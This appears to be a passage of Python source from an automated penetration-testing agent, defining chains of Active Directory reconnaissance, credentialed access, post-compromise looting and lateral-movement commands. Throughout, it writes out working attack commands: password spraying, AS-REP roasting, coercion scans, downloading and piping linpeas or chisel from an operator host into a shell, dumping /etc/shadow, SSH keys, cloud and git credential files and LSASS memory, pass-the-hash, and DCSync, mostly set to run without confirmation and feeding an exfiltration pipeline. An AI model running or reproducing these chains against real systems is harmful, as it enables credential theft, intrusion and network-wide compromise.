            return cls._DOMAIN_OUTPUT_PATTERNS
        import re
        cls._DOMAIN_OUTPUT_PATTERNS = [
            # rdp-ntlm-info / smb-os-discovery NSE script line
            (re.compile(r"DNS_Domain_Name:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.99),
            # crackmapexec / netexec banner: (domain:garfield.htb)
            (re.compile(r"\(domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})\)", re.I), 0.99),
            # ldapsearch / dnsrecon style: dc=garfield,dc=htb  →  garfield.htb
            (re.compile(r"\bdc=([A-Za-z0-9_-]+)(?:\s*,\s*dc=([A-Za-z0-9_-]+))+", re.I), 0.95),
            # Active Directory LDAP: Microsoft Windows Active Directory LDAP (Domain: garfield.htb)
            (re.compile(r"Active Directory LDAP\s*\(Domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})", re.I), 0.99),
            # FQDN of the DC itself (DNS_Computer_Name field)
            (re.compile(r"DNS_Computer_Name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.95),
            # Generic "Domain Controller for <domain>"
            (re.compile(r"[Dd]omain[\s_-]?[Cc]ontroller[^\n]{0,40}?([A-Za-z0-9_-]+\.[A-Za-z]{2,})"), 0.85),
            # smb-os-discovery: Computer name: dc01.garfield.htb
            (re.compile(r"Computer name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.90),
        ]
        return cls._DOMAIN_OUTPUT_PATTERNS

    @classmethod
    def _scan_raw_outputs_for_domain(cls, intel: dict) -> str:
        """Walk every blob in intel['raw_outputs'] and return the first
        confidently-matched AD DNS domain.  Empty string if none.

        Cheap regex sweep — runs only when the primer needs a domain and
        intel['domain'] / intel['ad'] haven't been populated yet by other
        extractors.
        """
        raw = intel.get("raw_outputs") or {}
        if not isinstance(raw, dict):
            return ""

        # Concatenate all blobs (capped to keep the regex cheap).
        # Raw outputs can be large; we only need the headers/banners.
        blobs: List[str] = []
        for tool_name, blob in raw.items():
            if not blob:
                continue
            text = blob if isinstance(blob, str) else str(blob)
            blobs.append(text[:8000])
        if not blobs:
            return ""
        all_text = "\n".join(blobs)

        for pat, _conf in cls._compile_domain_patterns():
            m = pat.search(all_text)
            if not m:
                continue
            # dc=foo,dc=bar pattern needs assembly from all groups
            if "dc=" in pat.pattern.lower():
                # Re-extract every dc=XXX component in order
                import re
                comps = re.findall(r"dc=([A-Za-z0-9_-]+)", m.group(0), re.I)
                if len(comps) >= 2:
                    return ".".join(comps).lower()
                continue
            cand = (m.group(1) or "").strip().lower()
            # Reject obvious garbage: very short, all-numeric, or template literal
            if cand and "." in cand and len(cand) >= 4 and not cand[0].isdigit():
                return cand
        return ""

    @classmethod
    def _resolve_ad_domain(cls, intel: dict, fallback: str = "") -> str:
        """Find the AD DNS domain from any source the recon phase has
        populated.  Priority:
          1. intel['domain']  (already-merged structured field)
          2. intel['ad']['dns_domain']  (set by primer's own auto-stamp)
          3. intel['services'][*]['domain']
          4. Live regex sweep over intel['raw_outputs']  ← new: catches
             rdp-ntlm-info, crackmapexec banner, ldap rootDSE, etc.
          5. fallback (often blank)

        When the regex sweep finds a domain, it stamps intel['domain'] and
        intel['ad']['dns_domain'] so subsequent calls and other components
        get O(1) lookup without re-scanning raw outputs.
        """
        d = (intel.get("domain") or "").strip()
        if d:
            return d
        ad = intel.get("ad") or {}
        if isinstance(ad, dict):
            d = (ad.get("dns_domain") or ad.get("domain") or "").strip()
            if d:
                return d
        services = intel.get("services") or {}
        if isinstance(services, dict):
            services_iter = services.values()
        else:
            services_iter = services
        for svc in services_iter:
            if not isinstance(svc, dict):
                continue
            d = (svc.get("domain") or svc.get("dns_domain") or "").strip()
            if d:
                return d
        # Live sweep
        d = cls._scan_raw_outputs_for_domain(intel)
        if d:
            intel["domain"] = d
            intel.setdefault("ad", {})["dns_domain"] = d
            return d
        return fallback

    @staticmethod
    def _domain_to_base_dn(domain: str) -> str:
        """garfield.htb → DC=garfield,DC=htb."""
        if not domain:
            return ""
        parts = [p for p in domain.split(".") if p]
        return ",".join(f"DC={p}" for p in parts)

    def _next_credentialed_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Return the next credentialed primer step that has not yet
        fired and whose required port is open.  Works for any service
        type — SSH, AD (SMB/WinRM/RDP/LDAP/Kerberos), databases (MySQL,
        Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth, SMTP.

        Returns None when:
          - no creds in operator_notes, OR
          - none of the primer ports are open on the target, OR
          - every applicable primer step has already fired this session.

        AD-specific steps that need {domain} / {base_dn} skip themselves
        when those values are unfilled — so a Linux SSH-only target
        never tries to kerberoast.
        """
        creds = self._extract_credentials(intel)
        if not creds:
            return None

        # Open ports — same parsing as unauth primer
        open_ports: set = set()
        for p in (intel.get("open_ports") or []):
            if isinstance(p, dict):
                pp = p.get("port")
                if pp is not None:
                    open_ports.add(str(pp))
            else:
                open_ports.add(str(p).split("/")[0])

        if not open_ports:
            return None

        # Resolve domain (only meaningful for AD steps; harmless for others).
        domain = creds.get("domain") or self._resolve_ad_domain(intel)
        if domain and not creds.get("domain"):
            creds["domain"] = domain
        base_dn = self._domain_to_base_dn(domain)

        # Track fired per-session
        fired = intel.setdefault("_cred_primers_fired", set())
        if isinstance(fired, list):
            fired = set(fired)
            intel["_cred_primers_fired"] = fired

        # Stash the parsed creds on intel so other components (extractors,
        # post-ex agents) can read them without re-parsing notes.  Two
        # locations: ad{} for AD-aware code, credentials[] for generic
        # consumers (web, db, ssh subagents).
        intel.setdefault("ad", {}).update({
            "user":     creds.get("user", ""),
            "password": creds.get("pass", ""),
            "dns_domain": domain,
            "base_dn":  base_dn,
        })
        cred_list = intel.setdefault("credentials", [])
        if isinstance(cred_list, list):
            entry = {
                "user":     creds.get("user", ""),
                "password": creds.get("pass", ""),
                "domain":   domain,
                "source":   "operator_notes",
            }
            if entry not in cred_list:
                cred_list.append(entry)

        for primer in self._CRED_PRIMERS:
            # Need at least one of the listed ports open
            if not (set(primer["ports"]) & open_ports):
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]

            # Skip if a placeholder needed by this primer is unfilled.
            # {domain} and {base_dn} are AD-only; defer them until recon
            # has populated the domain.  Everything else (target/user/
            # pass/dc_ip) is always available when creds were extracted.
            if "{domain}" in primer["args"] and not domain:
                continue
            if "{base_dn}" in primer["args"] and not base_dn:
                continue

            try:
                args_filled = primer["args"].format(
                    target  = target,
                    user    = creds["user"],
                    **{"pass": creds["pass"]},
                    domain  = domain,
                    dc_ip   = target,
                    base_dn = base_dn,
                )
            except Exception:
                continue

            # Negative-memory check — if this exact (tool, service, args) failed
            # already, mark fired and move on.
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                fired.add(primer_key)
                continue

            fired.add(primer_key)

            return JustifiedAction(
                action_id            = f"cred-primer-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = (
                    f"[Cred-Primer/{primer_key}] credentialed step — "
                    f"{primer['rationale']}"
                ),
                expected_outcome = (
                    "Successful authentication / shell / data listing — "
                    "or definitive 'access denied' to flag this primer dead."
                ),
                success_criteria = (
                    "Tool exits 0 with non-error output. "
                    "Shell-producing tools (sshpass+ssh, evil-winrm, "
                    "impacket-mssqlclient via xp_cmdshell) trigger a real "
                    "register_shell when the output contains uid= / Pwn3d! / "
                    "session-opened evidence."
                ),
                hypothesis_id        = "cred-primer",
                confidence           = 0.92,
                requires_confirmation= False,
            )

        return None

    # Backwards-compat alias — older callers may still reference the
    # original AD-only name; keep the symbol callable.
    _next_credentialed_ad_primer = _next_credentialed_primer

    # ────────────────────────────────────────────────────────────────────
    #  No-creds AD primer — kerbrute / null-session / AS-REP / spray
    # ────────────────────────────────────────────────────────────────────
    # When the target is a Windows AD host but no operator creds are
    # available, this chain extracts a foothold from public AD surface:
    #
    #  1. Anonymous LDAP rootDSE        — leaks defaultNamingContext / DN
    #  2. SMB null-session domain SID   — confirms domain + SID
    #  3. SMB null-session user enum    — RID-brute via enum4linux-ng / cme
    #  4. Anonymous LDAP user dump      — attempts -x bind for user list
    #  5. kerbrute userenum             — bulk pre-auth user discovery
    #  6. AS-REP roast (no-preauth users) on discovered usernames
    #  7. Conservative password spray   — Spring2024! / Welcome123 / season-year
    #     against discovered users (gated on `aggressive_mode` in intel)
    #  8. Responder analyze mode        — passive LLMNR/NBT-NS observation
    #  9. PetitPotam / DFSCoerce attempt — coerce DC auth to relay later
    #
    # Steps that need a username list (#6, #7) inspect intel['users'];
    # if it's empty they skip themselves until earlier discovery
    # populates it.  This keeps the chain deterministic but data-driven.
    _NOCREDS_AD_PRIMERS: List[Dict[str, Any]] = [
        # 1. Anonymous LDAP rootDSE — usually leaks DN even from outside
        {"chain": "nocreds_ldap_rootdse", "ports": ["389"],
         "tool": "ldapsearch",
         "args": "-H ldap://{target} -x -s base -b '' '(objectclass=*)' namingContexts defaultNamingContext",
         "service_label": "ldap:389",
         "rationale": "anonymous LDAP rootDSE — leaks DN even when bound entries are restricted"},
        # 2. SMB null-session domain SID
        {"chain": "nocreds_smb_lookupsid", "ports": ["445"],
         "tool": "impacket-lookupsid",
         "args": "anonymous@{target} -no-pass",
         "service_label": "smb:445",
         "rationale": "lookupsid via null-session — domain SID + RID-bruteable user enum"},
        # 3. SMB null-session full enum (user list, password policy)
        {"chain": "nocreds_enum4linux_ng", "ports": ["445"],
         "tool": "enum4linux-ng",
         "args": "-A -R -d {target}",
         "service_label": "smb:445",
         "rationale": "enum4linux-ng — null-session domain enum, RID brute, password policy"},
        # 4. crackmapexec null SMB → users
        {"chain": "nocreds_cme_smb_null_users", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u '' -p '' --rid-brute 4000",
         "service_label": "smb:445",
         "rationale": "RID-brute via null SMB session — collect domain user list"},
        # 5. kerbrute userenum — works on port 88 even without any creds
        {"chain": "nocreds_kerbrute_userenum", "ports": ["88"],
         "tool": "kerbrute",
         "args": "userenum --dc {target} -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --downgrade",
         "service_label": "kerberos:88",
         "rationale": "kerbrute with seclists usernames — pre-auth enum confirms valid users"},
        # 6. AS-REP roast (no preauth) — works against any user with the flag
        {"chain": "nocreds_asrep_known_users", "ports": ["88"],
         "tool": "impacket-GetNPUsers",
         "args": "{domain}/ -no-pass -dc-ip {target} -usersfile /tmp/argus.users.{target}.txt -outputfile /tmp/asrep.{target}.txt -format hashcat",
         "service_label": "kerberos:88",
         "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH using collected user list",
         "needs_users": True},
        # 7. CONSERVATIVE password spray — only fires when aggressive_mode
        # is set in intel (operator opted in) AND password policy known.
        {"chain": "nocreds_password_spray_seasonal", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u /tmp/argus.users.{target}.txt -p Welcome1 --continue-on-success",
         "service_label": "smb:445",
         "rationale": "single-password spray of Welcome1 against discovered users (LOW lockout risk)",
         "needs_users": True,
         "aggressive_only": True},
        # 8. Responder analyze mode — passive LLMNR/NBT-NS observation
        {"chain": "nocreds_responder_analyze", "ports": ["445"],
         "tool": "responder",
         "args": "-I tun0 -A",
         "service_label": "smb:445",
         "rationale": "passive LLMNR/NBT-NS analysis — confirm poisoning surface for later relay",
         "passive_only": True},
        # 9. coercer — PetitPotam / DFSCoerce / PrintNightmare auth coercion
        {"chain": "nocreds_coercer_scan", "ports": ["445"],
         "tool": "coercer",
         "args": "scan -u '' -p '' -t {target}",
         "service_label": "smb:445",
         "rationale": "scan for PetitPotam/DFSCoerce/PrintNightmare to coerce DC auth (relay later)"},
    ]

    # Common username defaults to seed kerbrute / asrep when no users
    # have been discovered yet from null-session enum.
    _COMMON_AD_USERNAMES = [
        "Administrator", "Guest", "krbtgt",
        "administrator", "guest", "admin",
        "backup", "service", "svc-sql", "svc-iis", "svc-web", "svc-backup",
    ]

    def _next_nocreds_ad_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """No-creds AD chain dispatcher.  Skips steps that need data
        (users / domain / aggressive consent) we don't have yet."""
        # Don't fire when creds ARE available — credentialed primer takes over.
        if self._extract_credentials(intel):
            return None

        open_ports = self._collect_open_ports(intel)
        if not open_ports:
            return None
        # Need at least one AD-style port open.  Otherwise this isn't AD.
        if not (open_ports & {"88", "389", "445", "5985", "3389"}):
            return None

        domain = self._resolve_ad_domain(intel)
        # If we don't know the domain yet, only the steps that don't need
        # {domain} can fire — that's exactly steps 1-4.
        users_file = f"/tmp/argus.users.{target}.txt"
        users_known = bool(self._collected_ad_users(intel, target))
        aggressive  = bool(intel.get("aggressive_mode") or intel.get("opted_in_spray"))
        passive_ok  = bool(intel.get("passive_capture_ok") or intel.get("on_engagement_lan"))

        fired = intel.setdefault("_nocreds_ad_primers_fired", set())
        if isinstance(fired, list):
            fired = set(fired); intel["_nocreds_ad_primers_fired"] = fired

        for primer in self._NOCREDS_AD_PRIMERS:
            if not (set(primer["ports"]) & open_ports):
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]
            if "{domain}" in primer["args"] and not domain:
                continue
            if primer.get("needs_users") and not users_known:
                continue
            if primer.get("aggressive_only") and not aggressive:
                continue
            if primer.get("passive_only") and not passive_ok:
                continue
            try:
                args_filled = primer["args"].format(
                    target=target, domain=domain or "", dc_ip=target,
                )
            except Exception:
                continue
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                fired.add(primer_key)
                continue
            fired.add(primer_key)
            return JustifiedAction(
                action_id            = f"nocreds-ad-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = f"[NoCreds-AD/{primer_key}] {primer['rationale']}",
                expected_outcome     = "User list / domain SID / AS-REP hashes / coercion paths",
                success_criteria     = "Tool exits 0 with non-empty output; user/SID/hash list populated",
                hypothesis_id        = "nocreds-ad-primer",
                confidence           = 0.85,
                requires_confirmation= False,
            )
        return None

    @staticmethod
    def _collect_open_ports(intel: dict) -> set:
        """Normalize intel.open_ports → set[str]."""
        out: set = set()
        for p in (intel.get("open_ports") or []):
            if isinstance(p, dict):
                pp = p.get("port")
                if pp is not None:
                    out.add(str(pp))
            else:
                out.add(str(p).split("/")[0])
        return out

    # ────────────────────────────────────────────────────────────────────
    #  #4 Post-foothold primer — loot collection + privesc enum
    # ────────────────────────────────────────────────────────────────────
    # Fires the moment register_shell() lands a confirmed foothold.
    # Each step runs through the EXISTING shell session (the executor
    # routes commands marked with `via_shell=True` through the active
    # shell rather than spawning a fresh tool).  Output flows into both
    # the findings store and the loot directory used by the exfil
    # pipeline (#7).
    #
    # Branches by OS detected from the shell's banner / uname / ver
    # output captured at register_shell time (intel['shell_os']).
    #
    # All steps are read-only / non-destructive — they enumerate and
    # collect, they don't modify the target.  Persistence + lateral
    # movement live in their own primers.
    _POST_FOOTHOLD_PRIMERS: List[Dict[str, Any]] = [
        # ── Identity / context ─────────────────────────────────────────
        {"chain": "post_id_linux", "os": ["linux", "unix"],
         "tool": "shell_exec",
         "args": "id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null; cat /etc/issue 2>/dev/null",
         "service_label": "shell:linux",
         "rationale": "establish identity + kernel/distro for exploit suggester"},
        {"chain": "post_id_windows", "os": ["windows"],
         "tool": "shell_exec",
         "args": "whoami /all; hostname; systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"; net user; net localgroup administrators",
         "service_label": "shell:windows",
         "rationale": "Windows identity, privileges, group membership"},

        # ── Privilege & escape vector enum ─────────────────────────────
        {"chain": "post_sudo_capabilities", "os": ["linux"],
         "tool": "shell_exec",
         "args": "sudo -n -l 2>&1; getcap -r / 2>/dev/null | head -50; find / -perm -4000 -type f 2>/dev/null | head -50; find / -writable -type d 2>/dev/null | grep -vE '^(/proc|/sys|/run|/tmp/.*\\.X11)' | head -30",
         "service_label": "shell:linux",
         "rationale": "sudo / SUID / capabilities / writable dirs — primary Linux privesc vectors"},
        {"chain": "post_win_priv", "os": ["windows"],
         "tool": "shell_exec",
         "args": "whoami /priv; whoami /groups; net session; net share; tasklist /v",
         "service_label": "shell:windows",
         "rationale": "Windows token privileges, sessions, shares, running tasks (Potato candidates)"},

        # ── Privesc enum scripts (heavy, gated by privesc_enabled flag) ─
        {"chain": "post_linpeas", "os": ["linux"],
         "tool": "shell_exec",
         "args": "(curl -fsSL http://{lhost}:8000/linpeas.sh 2>/dev/null || wget -qO - http://{lhost}:8000/linpeas.sh 2>/dev/null) | sh -s -- -q -a 2>&1 | tail -500",
         "service_label": "shell:linux",
         "rationale": "linpeas full enum — runs in target memory, no disk write",
         "heavy": True},
        {"chain": "post_winpeas", "os": ["windows"],
         "tool": "shell_exec",
         "args": "iwr http://{lhost}:8000/winpeas.exe -OutFile $env:temp\\wp.exe; & $env:temp\\wp.exe -q",
         "service_label": "shell:windows",
         "rationale": "winPEAS — comprehensive Windows privesc enum",
         "heavy": True},

        # ── Credential & key harvest (Linux) ───────────────────────────
        {"chain": "post_loot_ssh_keys", "os": ["linux"],
         "tool": "shell_exec",
         "args": "for d in /root /home/*; do test -d \"$d/.ssh\" && echo \"=== SSH keys in $d ===\" && ls -la \"$d/.ssh/\" 2>/dev/null && for f in \"$d/.ssh/\"id_* \"$d/.ssh/\"authorized_keys \"$d/.ssh/\"known_hosts \"$d/.ssh/\"config; do test -f \"$f\" && echo \"--- $f ---\" && cat \"$f\" 2>/dev/null; done; done",
         "service_label": "shell:linux",
         "rationale": "harvest SSH private keys + known_hosts for lateral movement"},
        {"chain": "post_loot_creds_files", "os": ["linux"],
         "tool": "shell_exec",
         "args": "for f in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history /root/.git-credentials /home/*/.git-credentials /root/.aws/credentials /home/*/.aws/credentials /root/.docker/config.json /home/*/.docker/config.json /root/.pgpass /home/*/.pgpass /root/.my.cnf /home/*/.my.cnf /root/.netrc /home/*/.netrc /etc/wpa_supplicant/wpa_supplicant.conf; do test -f \"$f\" && echo \"=== $f ===\" && cat \"$f\" 2>/dev/null; done",
         "service_label": "shell:linux",
         "rationale": "common credential / token files — git/AWS/docker/pgpass/my.cnf/netrc/WiFi"},
        {"chain": "post_loot_etc_passwd_shadow", "os": ["linux"],
         "tool": "shell_exec",
         "args": "cat /etc/passwd 2>/dev/null; echo '---SHADOW---'; cat /etc/shadow 2>/dev/null; echo '---GSHADOW---'; cat /etc/gshadow 2>/dev/null",
         "service_label": "shell:linux",
         "rationale": "shadow file → offline crack with hashcat for lateral creds (root-only)"},

        # ── Credential & key harvest (Windows) ─────────────────────────
        {"chain": "post_loot_win_files", "os": ["windows"],
         "tool": "shell_exec",
         "args": "Get-ChildItem -Path C:\\,C:\\Users -Include *.kdbx,*.config,unattend.xml,sysprep.xml,web.config,*.bak -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table -AutoSize",
         "service_label": "shell:windows",
         "rationale": "scan for KeePass DBs, unattend.xml, web.config — credential troves"},
        {"chain": "post_loot_win_creds_cmdkey", "os": ["windows"],
         "tool": "shell_exec",
         "args": "cmdkey /list; cmdkey /list:Domain:*; runas /savecred /list 2>&1; reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\" 2>&1; reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>&1",
         "service_label": "shell:windows",
         "rationale": "stored creds via cmdkey, RDP history, autologon password in registry"},
        {"chain": "post_loot_win_lsass", "os": ["windows"],
         "tool": "shell_exec",
         "args": "$p=Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $($p.Id) C:\\ProgramData\\dump.dmp full",
         "service_label": "shell:windows",
         "rationale": "LSASS minidump via comsvcs.dll — extract NTLM hashes / cleartext via pypykatz",
         "heavy": True},

        # ── Browser credential storage ─────────────────────────────────
        {"chain": "post_loot_browser_creds", "os": ["linux", "windows"],
         "tool": "shell_exec",
         "args": "echo 'Browser cred extraction requires lazagne/firepwd post-collection — staging candidate paths:'; ls -la $HOME/.mozilla/firefox/*/logins.json 2>/dev/null; ls -la $HOME/.config/google-chrome/Default/Login\\ Data 2>/dev/null; ls -la \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" 2>/dev/null; ls -la \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>/dev/null",
         "service_label": "shell:any",
         "rationale": "stage browser credential storage paths for lazagne / firepwd offline run"},

        # ── Database creds in apps + configs ───────────────────────────
        {"chain": "post_loot_app_configs", "os": ["linux"],
         "tool": "shell_exec",
         "args": "for d in /opt /var/www /srv /var/lib; do find $d -maxdepth 5 \\( -name '*.env' -o -name 'wp-config.php' -o -name '.env.local' -o -name 'settings.py' -o -name 'config.php' -o -name 'database.yml' -o -name 'application.properties' -o -name 'web.config' \\) -type f 2>/dev/null | head -30; done | while read f; do echo \"=== $f ===\"; cat \"$f\" 2>/dev/null | head -100; done",
         "service_label": "shell:linux",
         "rationale": "app-config files frequently embed DB / API credentials"},

        # ── Network context for lateral primer ─────────────────────────
        {"chain": "post_internal_recon", "os": ["linux"],
         "tool": "shell_exec",
         "args": "ip a; ip r; cat /etc/hosts; cat /etc/resolv.conf; ss -tnlp 2>/dev/null || netstat -tnlp 2>/dev/null; arp -a 2>/dev/null",
         "service_label": "shell:linux",
         "rationale": "internal interfaces, routes, listening ports, ARP cache — feed lateral primer"},
        {"chain": "post_internal_recon_win", "os": ["windows"],
         "tool": "shell_exec",
         "args": "ipconfig /all; route print; type C:\\Windows\\System32\\drivers\\etc\\hosts; arp -a; netstat -ano | findstr LISTENING",
         "service_label": "shell:windows",
         "rationale": "Windows internal networking + ARP cache for lateral primer"},
    ]

    def _next_post_foothold_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Fire the post-foothold loot+enum chain.  Only runs after a
        confirmed shell exists — gated on intel['shell_access']."""
        if not intel.get("shell_access"):
            return None
        # Don't fire if no shell session record
        shells = intel.get("shells") or []
        active_shells = [s for s in shells if isinstance(s, dict) and not s.get("pending")]
        if not active_shells:
            return None

        os_kind = self._infer_shell_os(intel)
        if not os_kind:
            return None

        fired = intel.setdefault("_post_foothold_fired", set())
        if isinstance(fired, list):
            fired = set(fired); intel["_post_foothold_fired"] = fired

        is_root = self._shell_user_is_privileged(intel)
        loot_heavy_ok = bool(intel.get("loot_heavy_enabled"))  # operator opt-in
        lhost = intel.get("lhost") or ""

        for primer in self._POST_FOOTHOLD_PRIMERS:
            if os_kind not in [o.lower() for o in primer.get("os", [])]:
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]

            # Heavy steps require operator opt-in (linpeas / winpeas /
            # LSASS dump touch detection surface).
            if primer.get("heavy") and not loot_heavy_ok:
                continue
            # Shadow / SAM dump only when the shell is root/admin
            if "shadow" in primer["chain"] or "lsass" in primer["chain"]:
                if not is_root:
                    continue

            try:
                args_filled = primer["args"].format(
                    target=target, lhost=lhost or "127.0.0.1",
                )
            except Exception:
                continue
            if negative_memory.has_failed_before(tool, svc, args=args_filled[:200]):
                fired.add(primer_key)
                continue
            fired.add(primer_key)
            return JustifiedAction(
                action_id            = f"post-foothold-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = f"[Post-Foothold/{primer_key}] {primer['rationale']}",
                expected_outcome     = "Loot collected: SSH keys / hashes / configs / browser creds / network map",
                success_criteria     = "Shell command exits 0; output ingested into loot manifest for exfil pipeline",
                hypothesis_id        = "post-foothold-primer",
                confidence           = 0.90,
                requires_confirmation= False,
            )
        return None

    # ────────────────────────────────────────────────────────────────────
    #  #6 Lateral-movement primer
    # ────────────────────────────────────────────────────────────────────
    # Once a real foothold is registered AND we've completed the
    # post-foothold loot pass, fire deterministic lateral steps using
    # whatever harvested material is available:
    #
    #  - Internal port scan (proxychains nmap from compromised host)
    #  - SSH key reuse against discovered internal hosts
    #  - SMB pass-the-hash with collected NT hashes
    #  - Kerberos PTT with collected TGTs / TGSes
    #  - chisel / SOCKS pivot tunnel setup for next-hop scanning
    #
    # All "from-the-foothold" steps run via shell_exec on the active
    # session — they don't fire fresh sockets from the operator box.
    _LATERAL_PRIMERS: List[Dict[str, Any]] = [
        # ── Step 1 — Internal subnet discovery (Linux foothold) ────────
        {"chain": "lat_int_recon_linux", "os": ["linux"],
         "tool": "shell_exec",
         "args": "ip -o addr show | awk '$3==\"inet\"{{print $4}}'; ip route | grep -v default; cat /etc/hosts; getent hosts $(hostname) 2>/dev/null",
         "service_label": "shell:linux",
         "rationale": "enumerate the foothold's internal subnets + hosts"},
        {"chain": "lat_int_recon_win", "os": ["windows"],
         "tool": "shell_exec",
         "args": "ipconfig /all; route print; arp -a; net view; nltest /dclist:",
         "service_label": "shell:windows",
         "rationale": "Windows internal network + DC list for next-hop targets"},
        # ── Step 2 — Quick internal nmap (Linux) ───────────────────────
        # Cheap TCP-connect ping sweep + top-100 ports on the local /24
        {"chain": "lat_internal_nmap_linux", "os": ["linux"],
         "tool": "shell_exec",
         "args": "(command -v nmap >/dev/null && nmap -sn -PE -PA22,80,445,3389,5985 $(ip -o addr show | awk '$3==\"inet\"&&$4!~/^127/{{print $4}}' | head -1) -oG - 2>/dev/null | grep Up) || (for i in $(seq 1 254); do net=$(ip -o addr show | awk '$3==\"inet\"&&$4!~/^127/{{print $4}}' | head -1 | cut -d. -f1-3); (timeout 1 bash -c \"echo > /dev/tcp/$net.$i/22\" 2>/dev/null && echo \"$net.$i:22\") & done; wait)",
         "service_label": "shell:linux",
         "rationale": "discover live internal hosts via nmap or pure-bash /dev/tcp sweep"},
        # ── Step 3 — Internal nmap from Windows foothold ───────────────
        {"chain": "lat_internal_nmap_win", "os": ["windows"],
         "tool": "shell_exec",
         "args": "$nets = (Get-NetIPAddress -AddressFamily IPv4 | Where {{$_.IPAddress -notlike '127.*'}}).IPAddress; foreach ($net in $nets) {{ $base = ($net -split '\\.')[0..2] -join '.'; 1..254 | ForEach-Object -Parallel {{ $ip = \"$using:base.$_\"; $r = Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 1 -Quiet; if ($r) {{ Write-Host \"$ip alive\" }} }} -ThrottleLimit 50 }}",
         "service_label": "shell:windows",
         "rationale": "internal /24 ping sweep from Windows foothold"},
        # ── Step 4 — SSH key reuse against discovered hosts (Linux) ────
        {"chain": "lat_ssh_key_reuse", "os": ["linux"],
         "tool": "shell_exec",
         "args": "for k in /root/.ssh/id_* /home/*/.ssh/id_*; do [ -f \"$k\" ] || continue; for h in $(cat /tmp/argus.lateral.{target}.hosts 2>/dev/null); do echo \"=== trying $k on $h ===\"; timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 -i \"$k\" \"$(basename $(dirname $(dirname $k)))@$h\" 'id; hostname' 2>&1; done; done",
         "service_label": "shell:linux",
         "rationale": "reuse harvested SSH private keys against discovered internal hosts",
         "needs_loot": "ssh_keys"},
        # ── Step 5 — SMB pass-the-hash spray (from outside, with hash) ─
        # Runs from operator's machine using the harvested NT hash
        {"chain": "lat_pth_smb_spray", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb /tmp/argus.lateral.{target}.hosts -u {loot_user} -H {loot_hash} --shares",
         "service_label": "smb:445",
         "rationale": "pass-the-hash with harvested NT hash across discovered hosts",
         "needs_loot": "nt_hash"},
        # ── Step 6 — Kerberos PTT (when we have a TGT or TGS) ──────────
        {"chain": "lat_kerberos_ptt", "ports": ["88"],
         "tool": "impacket-getST",
         "args": "-spn cifs/{lateral_target} -impersonate Administrator {domain}/{loot_user} -k -no-pass",
         "service_label": "kerberos:88",
         "rationale": "S4U2self/proxy ticket forge — lateral movement via Kerberos delegation",
         "needs_loot": "tgt"},
        # ── Step 7 — Tunnel setup for direct operator → internal ────────
        # Drops chisel client on foothold and connects back to operator
        # (which runs `chisel server -p 8000 --reverse`).  After this
        # the operator can `proxychains nmap`, etc.
        {"chain": "lat_chisel_tunnel", "os": ["linux"],
         "tool": "shell_exec",
         "args": "(curl -fsSL http://{lhost}:8000/chisel -o /tmp/.cs && chmod +x /tmp/.cs && /tmp/.cs client {lhost}:8000 R:1080:socks &) 2>/dev/null; sleep 2; pgrep -f /tmp/.cs",
         "service_label": "shell:linux",
         "rationale": "chisel reverse SOCKS tunnel — operator gets direct internal-network reach"},
        # ── Step 8 — Linux SUDO-based pivot (sudo su to other users) ───
        {"chain": "lat_sudo_pivot", "os": ["linux"],
         "tool": "shell_exec",
         "args": "sudo -l -n 2>&1 | grep -E 'NOPASSWD|may run' | head -20",
         "service_label": "shell:linux",
         "rationale": "find sudo NOPASSWD entries that allow sudo-to-other-users (lateral within host)"},
        # ── Step 9 — DCSync via secretsdump (when foothold is DA) ──────
        {"chain": "lat_dcsync_dump", "ports": ["445"],
         "tool": "impacket-secretsdump",
         "args": "-just-dc-ntlm -outputfile /tmp/argus.dcsync.{target} {domain}/{loot_user}@{lateral_target} -hashes :{loot_hash}",
         "service_label": "smb:445",
         "rationale": "DCSync the entire domain — lateral by hash to every machine account",
         "needs_loot": "nt_hash",
         "needs_priv":  "domain_admin"},
    ]

